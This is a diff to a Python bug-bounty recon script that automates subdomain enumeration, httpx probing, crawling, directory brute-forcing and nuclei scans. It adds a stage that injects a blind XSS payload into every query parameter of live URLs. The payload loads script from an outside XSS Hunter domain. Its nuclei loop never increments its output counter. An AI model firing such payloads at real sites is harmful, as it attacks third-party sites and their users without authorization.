@@ -72,9 +72,13 @@ filenames = {
 REDIRECT_CODES = {300,301,302,303,307,308}
 SKIP_GOBUSTER = False
 
+GO_BIN_DIR = os.getenv("GO_BIN_DIR", str(Path.home() / "go" / "bin"))
+
 # Gobuster defaults (can be overridden via CLI)
 GOBUSTER_WORDLIST = os.getenv("GOBUSTER_WORDLIST", "/usr/share/seclists/Discovery/Web-Content/common.txt")
 GOBUSTER_PROXY: Optional[str] = None
+
+SKIP_BLIND_XSS = False
 
 # ENV variables
 XSS_HUNTER_DOMAIN = os.getenv("XSS_HUNTER_DOMAIN", "")
@@ -697,11 +701,11 @@ def amass_scan(folder: Path, domain: str):
         print(f"{Colors.OKGREEN}amass_scan: {amass_file} already exists, skipping scan{Colors.ENDC}")
         return amass_file
 
-def merge_subdomains(folder: Path, domain: str):
+def merge_subdomains(folder: Path, domain: str, pre_sub = ""):
     print(f"{Colors.HEADER}{Colors.BOLD}Merging subdomain files for {domain}{Colors.ENDC}")
     findomain_file = filenames['findomain'].format(domain)
     amass_file = filenames['amass'].format(domain)
-    merged_file = filenames['merged_subdomains'].format(domain)
+    merged_file = filenames['alive_subs'].format(domain)
 
     if not (folder / merged_file).exists():
         existing_files = []
@@ -715,7 +719,11 @@ def merge_subdomains(folder: Path, domain: str):
             print(f"{Colors.WARNING}merge_subdomains: No input files found ({findomain_file}, {amass_file}), skipping{Colors.ENDC}")
             return
         
-        run_cmd(f"cat {' '.join(existing_files)} | sort -u | dnsx -silent -a -o {merged_file}", cwd=folder, allow_empty_stdout=True)
+        if pre_sub:
+            run_cmd(f"cat {' '.join(existing_files)} | grep -E \"^{pre_sub}\" | sort -u | dnsx -silent -a -o {merged_file}", cwd=folder, allow_empty_stdout=True)
+
+        else:
+            run_cmd(f"cat {' '.join(existing_files)} | sort -u | dnsx -silent -a -o {merged_file}", cwd=folder, allow_empty_stdout=True)
 
         print(f"{Colors.OKGREEN}merge_subdomains: Merged {existing_files} unique subdomains into {merged_file}{Colors.ENDC}")
         return merged_file
@@ -770,7 +778,8 @@ def merge_httpx_files(folder: Path, domain: str):
     
     if not (folder / alive_urls_file).exists():
         if (folder / unique_urls_file).exists():
-            alive_cmd = f"httpx -rate-limit 4 -o {alive_urls_file}{hdr()}"
+            # USE GO BIN DIR
+            alive_cmd = f"{GO_BIN_DIR}/httpx -rate-limit 5 -o {alive_urls_file}{hdr()}"
             run_cmd(f"cat {unique_urls_file} | {alive_cmd}", cwd=folder, allow_empty_stdout=True)
             print(f"{Colors.OKGREEN}merge_httpx_files: Created alive URLs file {alive_urls_file}{Colors.ENDC}")
             return alive_urls_file
@@ -789,8 +798,12 @@ def nuclei_scan(folder: Path, domain: str):
     techs = set()
     targets: List[str] = []
     seen = set()
+    
+    targets = {
 
-    if (folder / pretty_httpx_file).stat().st_size > 0 and not (folder / nuclei_file).exists():
+    }
+
+    if (folder / pretty_httpx_file).stat().st_size > 0 and not (folder / f"0_{nuclei_file}").exists():
         with (folder / pretty_httpx_file).open("r", errors="ignore") as f:
             for line in f:
                 if not line.strip():
@@ -798,24 +811,31 @@ def nuclei_scan(folder: Path, domain: str):
                 url = line.split()[0]
                 if url not in seen:
                     seen.add(url)
-                    targets.append(url)
+                    targets[url] = set()
 
                 tech_matches = re.findall(r"\[.+?\]", line)
                 for tech in KNOWN_TECHS:
                     for attempt_tech in tech_matches:
                         if tech.lower() in attempt_tech.lower():
-                            techs.add(tech)
-                            
-        if techs:
-            nuclei_tags = f",".join(KNOWN_TECHS[tech]['nuclei_tags'] for tech in techs)
-            nuclei_templates = ','.join(KNOWN_TECHS[tech]['nuclei_templates'] for tech in techs)
+                            targets[url].add(tech)
 
-            # TODO: implement nuclei cve's and other options
-            print(f"{Colors.OKBLUE}{Colors.BOLD}Nuclei scan for {url} with techs: {', '.join(techs)}{Colors.ENDC}")
-            nuclei_urls = ",".join(f"{url}" for url in targets)
-            nuclei_command = f"nuclei -u {nuclei_urls} -o {nuclei_file} --tags default,{nuclei_tags} --templates {nuclei_templates}{hdr()}"
-            print(nuclei_command)
-            run_cmd(nuclei_command, cwd=folder, allow_empty_stdout=True)
+        if targets != {}:
+            i = 0  
+            for url, tech_set in targets.items():
+                if tech_set == set():
+                    continue
+                nuclei_tags = f",".join(KNOWN_TECHS[tech]['nuclei_tags'] for tech in tech_set)
+                nuclei_templates = '--templates ' + ','.join(KNOWN_TECHS[tech]['nuclei_templates'] for tech in tech_set)
+                if nuclei_templates == '--templates ':
+                    nuclei_templates = ''
+                    
+                # TODO: implement nuclei cve's and other options
+                print(f"{Colors.OKBLUE}{Colors.BOLD}Nuclei scan for {url} with techs: {', '.join(tech_set)}{Colors.ENDC}")
+                nuclei_urls = shlex.quote(url)
+                nuclei_command = f"nuclei -u {nuclei_urls} -o {i}_{nuclei_file} --tags default,{nuclei_tags} {nuclei_templates}{hdr()}"
+                print(nuclei_command)
+                run_cmd(nuclei_command, cwd=folder, allow_empty_stdout=True)
+                
             return nuclei_file
 
         else:
@@ -856,40 +876,42 @@ def xss_scan(folder: Path, domain: str):
         print(f"{Colors.WARNING}xss_scan: XSS_HUNTER_DOMAIN not set, skipping{Colors.ENDC}")
         return
 
-    xss_hunter_payload = f"<script src='https://{XSS_HUNTER_DOMAIN}/abc.js'></script>"
+    xss_hunter_payload = f"\"><script src=https://{XSS_HUNTER_DOMAIN}/tbm.js></script>"
 
     if not (folder / alive_query_file).exists():
         print(f"{Colors.WARNING}xss_scan: file {alive_query_file} missing, skipping{Colors.ENDC}")
         return
 
-    print(f"{Colors.OKBLUE}{Colors.BOLD}Running Dalfox scan on URLs for {domain}...{Colors.ENDC}")
+    # print(f"{Colors.OKBLUE}{Colors.BOLD}Running Dalfox scan on URLs for {domain}...{Colors.ENDC}")
+    print(f'{Colors.OKBLUE}{Colors.BOLD}Reflected xss not implemented. Preparing to inject Blind XSS payloads...{Colors.ENDC}')
+    # dalfox_cmd = f"dalfox file {alive_query_file} --output {output_file} --delay 200 --worker 10 --waf-evasion--skip-mining-all --skip-bav {hdr()}"
+    # run_cmd(dalfox_cmd, cwd=folder, allow_empty_stdout=True)
 
-    dalfox_cmd = f"dalfox file {alive_query_file} --output {output_file} --delay 200 --worker 10 --waf-evasion --skip-mining-all --skip-mining-all --skip-bav {hdr()}"
-    run_cmd(dalfox_cmd, cwd=folder, allow_empty_stdout=True)
+    if not SKIP_BLIND_XSS:
+        # Step 2: blind xss
+        print(f"{Colors.OKBLUE}{Colors.BOLD}Injecting Blind XSS payloads...{Colors.ENDC}")
+        with (folder / alive_query_file).open("r") as f:
+            for line in f:
+                parsed = urlparse(line)
+                query = parse_qs(parsed.query)
+                injected_query = {k: xss_hunter_payload for k in query}
+                new_query = urlencode(injected_query, doseq=True)
+                new_url = urlunparse(parsed._replace(query=new_query))
 
-    # Step 2: blind xss
-    print(f"{Colors.OKBLUE}{Colors.BOLD}Injecting Blind XSS payloads...{Colors.ENDC}")
-    with (folder / alive_query_file).open("r") as f:
-        for line in f:
-            parsed = urlparse(line)
-            query = parse_qs(parsed.query)
-            injected_query = {k: xss_hunter_payload for k in query}
-            new_query = urlencode(injected_query, doseq=True)
-            new_url = urlunparse(parsed._replace(query=new_query))
-
-            try:
-                thisHeaders = headers.copy()
-                if extra_header:
-                    thisHeaders[extra_header.split(':')[0]] = extra_header.split(':')[1][1:]
-                response = requests.get(new_url, headers=thisHeaders, timeout=4, verify=False)
-                print(f"{Colors.OKBLUE}Sent blind XSS payload to: {new_url} [Status: {response.status_code}]{Colors.ENDC}")
-            except requests.RequestException as e:
-                print(f"{Colors.WARNING}Request failed for {new_url}: {e}{Colors.ENDC}")
-
-    print(f"{Colors.OKCYAN}Blind XSS payloads sent. Monitor your XSS Hunter dashboard.{Colors.ENDC}")
-    print(f"{Colors.OKGREEN}XSS Scan completed. Results saved to:{Colors.ENDC}")
-    print(f"  - {output_file}   (Reflected/Stored XSS)")
-    print(f"  - {blind_file}    (Blind XSS URLs)")
+                try:
+                    thisHeaders = headers.copy()
+                    if extra_header:
+                        thisHeaders[extra_header.split(':')[0]] = extra_header.split(':')[1][1:]
+                    response = requests.get(new_url, headers=thisHeaders, timeout=4, verify=False)
+                    print(f"{Colors.OKBLUE}Sent blind XSS payload to: {new_url} [Status: {response.status_code}]{Colors.ENDC}")
+                except requests.RequestException as e:
+                    print(f"{Colors.WARNING}Request failed for {new_url}: {e}{Colors.ENDC}")
+        print(f"{Colors.OKCYAN}Blind XSS payloads sent. Monitor your XSS Hunter dashboard.{Colors.ENDC}")
+        print(f"{Colors.OKGREEN}XSS Scan completed. Results saved to:{Colors.ENDC}")
+        print(f"  - {output_file}   (Reflected/Stored XSS)")
+        print(f"  - {blind_file}    (Blind XSS URLs)")
+    else:
+        print(f"{Colors.WARNING}Skipping Blind XSS injection as per configuration.{Colors.ENDC}")
 
     return output_file
 
@@ -919,7 +941,7 @@ def run_katana(folder: Path, domain: str, single_domain = False):
     if (folder / alive_subs_file).stat().st_size > 0 and not (folder / katana_file).exists():
         katana_base = f"katana -list {alive_subs_file} -o {katana_file} -fs fqdn -d 3 -jc -kf all -silent{hdr()}"
         try:
-            run_cmd(f"timeout 30m {katana_base}", cwd=folder, allow_empty_stdout=True)
+            run_cmd(f"timeout 20m {katana_base}", cwd=folder, allow_empty_stdout=True)
 
         except RuntimeError as e:
             print(f"{Colors.WARNING}Katana failed or timed out: {e}{Colors.ENDC}")
@@ -939,7 +961,7 @@ def httpx_tech_detect(folder: Path, domain: str):
         return
 
     if (folder / alive_subs_file).stat().st_size > 0 and not (folder / httpx_tech_file).exists():
-        httpx_cmd = f"httpx -hc -cl -tech-detect -title {hdr()}"
+        httpx_cmd = f"{GO_BIN_DIR}/httpx -hc -cl -tech-detect -title {hdr()}"
         run_cmd(f"cat {alive_subs_file} | {httpx_cmd} > {httpx_tech_file}", cwd=folder)
         return folder / httpx_tech_file
     else:
@@ -948,12 +970,12 @@ def httpx_tech_detect(folder: Path, domain: str):
 
 def pretty_httpx(folder: Path, domain: str):
     print(f"{Colors.HEADER}{Colors.BOLD}Generating pretty_httpx for {domain}{Colors.ENDC}")
-    subs_file = filenames['merged_subdomains'].format(domain)
+    subs_file = filenames['alive_subs'].format(domain)
     pretty_httpx = filenames['pretty_httpx'].format(domain)
 
     if not (folder / pretty_httpx).exists() and (folder / subs_file).exists():
         run_cmd(
-            f"cat {subs_file} | httpx -silent -title -status-code -content-length -tech-detect -follow-redirects -location -o {pretty_httpx}{hdr()}",
+            f"cat {subs_file} | {GO_BIN_DIR}/httpx -silent -title -status-code -content-length -tech-detect -follow-redirects -location -o {pretty_httpx}{hdr()}",
             cwd=folder
         )
 
@@ -978,7 +1000,12 @@ def sort_all_urls(folder: Path, domain: str):
 
 def process_wildcard(domain, base_dir, processed_urls = set()):
     print(f"{Colors.HEADER}{Colors.BOLD}Processing: {domain}{Colors.ENDC}")
-    clean_domain = domain.replace("*.", "").strip()
+    pre_sub = ""
+    if domain.split("*.")[0] != "":
+        pre_sub = domain.split("*.")[0]
+        clean_domain = domain.split("*.")[1].strip()
+    else:
+        clean_domain = domain.replace("*.", "").strip()
     try:
         ascii_domain = idna.encode(clean_domain).decode('utf-8')
     except Exception as e:
@@ -988,10 +1015,6 @@ def process_wildcard(domain, base_dir, processed_urls = set()):
     folder = base_dir / ascii_domain
     folder.mkdir(parents=True, exist_ok=True)
 
-    subs_file = f"{ascii_domain}.txt"
-    alive_file = "alive_urls"
-    pretty_httpx = "pretty_httpx.txt"
-
     # 1: findomain (creates subs file automatically with -o)
     findomain_scan(folder, ascii_domain)
 
@@ -999,7 +1022,7 @@ def process_wildcard(domain, base_dir, processed_urls = set()):
     amass_scan(folder, ascii_domain)
     
     # 2b: merge findomain + amass
-    merge_subdomains(folder, ascii_domain)
+    merge_subdomains(folder, ascii_domain, pre_sub)
 
     # Step 3: httpx tech detect and alive
     httpx_tech_detect(folder, ascii_domain)
@@ -1013,13 +1036,21 @@ def process_wildcard(domain, base_dir, processed_urls = set()):
     # 5: Filter unique paths and domains that are not the base_domain variable and merge
     merge_httpx_files(folder, ascii_domain)    
 
+    # Step 6: Xss scan if applicable
+    create_query_only_file(folder, ascii_domain)
+    if (folder / filenames['query_only'].format(ascii_domain)).exists() and (folder / filenames['query_only'].format(ascii_domain)).stat().st_size > 0:
+        xss_scan(folder, ascii_domain)
+
     # 7: JS analyzsis
-    try:
-        js_stats = analyze_js_files(folder, ascii_domain)
-        if js_stats.get("dir"):
-            print(f"{Colors.OKGREEN}JS analysis found {js_stats['secrets_found']} secrets and {js_stats['endpoints_extracted']} endpoints in {js_stats['js_urls_checked']} JS files.{Colors.ENDC}")
-    except Exception as e:
-        print(f"{Colors.WARNING}JS analysis failed: {e}{Colors.ENDC}")
+    if not (folder / "js_analysis").exists():
+        try:
+            js_stats = analyze_js_files(folder, ascii_domain)
+            if js_stats.get("dir"):
+                print(f"{Colors.OKGREEN}JS analysis found {js_stats['secrets_found']} secrets and {js_stats['endpoints_extracted']} endpoints in {js_stats['js_urls_checked']} JS files.{Colors.ENDC}")
+        except Exception as e:
+            print(f"{Colors.WARNING}JS analysis failed: {e}{Colors.ENDC}")
+    else:
+        print(f"{Colors.OKGREEN}JS analysis already done, skipping.{Colors.ENDC}")
 
     # 8: classify/sort
     sort_all_urls(folder, ascii_domain)
@@ -1028,14 +1059,19 @@ def process_wildcard(domain, base_dir, processed_urls = set()):
     pretty_httpx(folder, ascii_domain)
 
     # 10: light sensitive endpoint enumeration (optional, ignore failures)
-    try:
-        if GOBUSTER_WORDLIST and not SKIP_GOBUSTER:
-            enumerate_domains(folder / pretty_httpx, folder, GOBUSTER_THREADS, GOBUSTER_PROXY, GOBUSTER_WORDLIST)
-    except Exception as e:
-        print(f"{Colors.WARNING}Internal gobuster enumeration failed: {e}{Colors.ENDC}")
+    if not (folder / "gobuster_results").exists():
+        try:
+            if GOBUSTER_WORDLIST and not SKIP_GOBUSTER:
+                enumerate_domains(folder / filenames['pretty_httpx'].format(ascii_domain), folder, GOBUSTER_THREADS, GOBUSTER_PROXY, GOBUSTER_WORDLIST)
+        except Exception as e:
+            print(f"{Colors.WARNING}Internal gobuster enumeration failed: {e}{Colors.ENDC}")
 
     print(f"{Colors.OKGREEN}Processing for {domain} completed. Temp results in {folder}{Colors.ENDC}")
 
+    # Step 11: nuclei scan based on techs
+    nuclei_scan(folder, ascii_domain)
+
+    # Done
     run_cmd(f"find . -size 0 -print -delete", cwd=folder, allow_empty_stdout=True)
 
 def process_url(url, base_dir):
@@ -1270,7 +1306,7 @@ def generate_reports(run_dir: Path):
 
 def main():
     global extra_header
-    global GOBUSTER_THREADS, GOBUSTER_PROXY, GOBUSTER_WORDLIST, SKIP_GOBUSTER
+    global GOBUSTER_THREADS, GOBUSTER_PROXY, GOBUSTER_WORDLIST, SKIP_GOBUSTER, SKIP_BLIND_XSS
     parser = argparse.ArgumentParser(description="Bug bounty wildcard automation script")
     parser.add_argument("--json", default="assets.json", help="Path to assets JSON file")
     parser.add_argument("--header", default=None, help="Optional program header (e.g. auth cookie)")
@@ -1283,6 +1319,7 @@ def main():
     parser.add_argument("--specific-domain", default=None, help="For testing: process only this specific domain from the JSON")
     parser.add_argument("--only-urls", action="store_true", help="Process only URLs from the JSON, skip wildcards")
     parser.add_argument("--only-wildcards", action="store_true")
+    parser.add_argument("--skip-blind", action="store_true", help="Skip blind XSS injection phase")
     parser.add_argument("--dry-run", action="store_true", help="Dry run mode, do not execute commands")
     args = parser.parse_args()
 
@@ -1335,6 +1372,8 @@ def main():
         return
     
     SKIP_GOBUSTER = args.skip_gobuster
+    SKIP_BLIND_XSS = args.skip_blind
+
     if not args.only_wildcards:
         with ThreadPoolExecutor(max_workers=args.workers) as executor:
             futures = {executor.submit(process_url, u, run_dir): u for u in urls if (not args.specific_domain) or (u == args.specific_domain)}
@@ -1359,6 +1398,7 @@ def main():
                     fut.result()
                 except Exception as e:
                     print(f"{Colors.FAIL}{Colors.BOLD}Domain {dom} failed: {e}{Colors.ENDC}")
+                    traceback.print_exc()
 
     # After all domains processed, generate aggregated reports
     print(f'{Colors.HEADER}{Colors.BOLD}Generating reports...{Colors.ENDC}')
